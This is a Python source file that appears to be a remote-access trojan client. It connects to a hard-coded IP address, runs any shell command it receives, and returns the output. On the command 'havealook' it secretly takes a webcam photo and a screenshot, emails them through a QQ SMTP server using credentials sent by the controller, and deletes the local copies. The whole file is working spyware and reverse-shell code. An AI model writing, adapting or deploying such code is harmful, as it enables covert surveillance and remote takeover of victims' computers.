from socket import *
from PIL import ImageGrab
import win32api,win32con
from os import path,remove,popen
import cv2
import smtplib
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import time
#客户端接收执行命令

c=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
c.connect(('47.112.188.203',6666))#连接地址

output_dir='./'
photo_number = 1


def take_photo():
    global output_dir
    global photo_number
    cap = cv2.VideoCapture(0,cv2.CAP_DSHOW)
    time.sleep(3)
    ret, frame = cap.read()
    output_path = path.join(output_dir,  "camera_%04d.jpg" % photo_number)
    cv2.imwrite(output_path, frame)
    return output_path

def take_screen():
    global output_dir
    global photo_number
    width = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)

    output_path = path.join(output_dir,  "screen_%04d.jpg" % photo_number)

    img = ImageGrab.grab(bbox=(0, 0, width, height))
    img.save(output_path)
    return output_path

def save_picture():

    global photo_number
    global photo_path
    global screen_path
    photo_path = take_photo()
    screen_path = take_screen()
    photo_number = photo_number + 1


def open_image(path):
    fp = open(path, 'rb')
    msgImage = MIMEImage(fp.read())
    fp.close()
    return msgImage

def remove_img(img_path):
    if path.exists(img_path):
        remove(img_path)

def send_img():
    global sender

    global receivers  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱

    global password

    smtp_server = 'smtp.qq.com'

    #创建一个带附件的实例
    message = MIMEMultipart()
    message['From'] = Header("shell", 'utf-8')
    message['To'] =  Header("server", 'utf-8')
    subject = 'HAVE A LOOK!'
    message['Subject'] = Header(subject, 'utf-8')

    msgAlternative = MIMEMultipart('alternative')
    message.attach(msgAlternative)

    mail_msg = """
    <p><a href="https://0xfay.github.io">博客传送门</a></p>
    <p>照片：</p>
    <p><img src="cid:image1"></p>
    <p>截图：</p>
    <p><img src="cid:image2"></p>
    """

    msgAlternative.attach(MIMEText(mail_msg, 'html', 'utf-8'))

    msg_photo = open_image(photo_path)
    msg_screen = open_image(screen_path)

    msg_photo.add_header('Content-ID', '<image1>')
    message.attach(msg_photo)

    msg_screen.add_header('Content-ID', '<image2>')
    message.attach(msg_screen)

    #发送附件

    #邮件正文内容
    #message.attach(MIMEText('xxxxxxxxxx', 'plain', 'utf-8'))
 
    # 构造附件1，传送当前目录下的 test.txt 文件
    #att1 = MIMEText(open('test.txt', 'rb').read(), 'base64', 'utf-8')
    #att1["Content-Type"] = 'application/octet-stream'

    # 这里的filename可以任意写，写什么名字，邮件中显示什么名字
    #att1["Content-Disposition"] = 'attachment; filename="test.txt"'
    #message.attach(att1)
 
    try:
        smtpObj = smtplib.SMTP_SSL(host=smtp_server)
        smtpObj.connect(host=smtp_server,port=465)
        smtpObj.login(sender, password)
        smtpObj.sendmail(sender, receivers, message.as_string())

        smtpObj.quit()
        remove_img(photo_path)
        remove_img(screen_path)
        
        return "[+] 邮件发送成功"

    except smtplib.SMTPException:
        return "[-] Error: 无法发送邮件"

if __name__ == '__main__':

    sender = c.recv(1024).decode()

    receiver = c.recv(1024).decode()
    receivers = []
    receivers.append(receiver)

    password = c.recv(1024).decode()

    while True:

        cmd=c.recv(10240)
        cmdstr=cmd.decode()

        if cmdstr == 'havealook':
            save_picture()
            result = send_img()

        #if cmdstr == 'exit':
        #    c.close()
        #    break
    
        else:
            try:
                result=popen(cmdstr).read()
                if result == '':
                    result='[-] ERROR_COMMAND'
            except:
                result='[-] ERROR_COMMAND'

        c.send(result.encode())
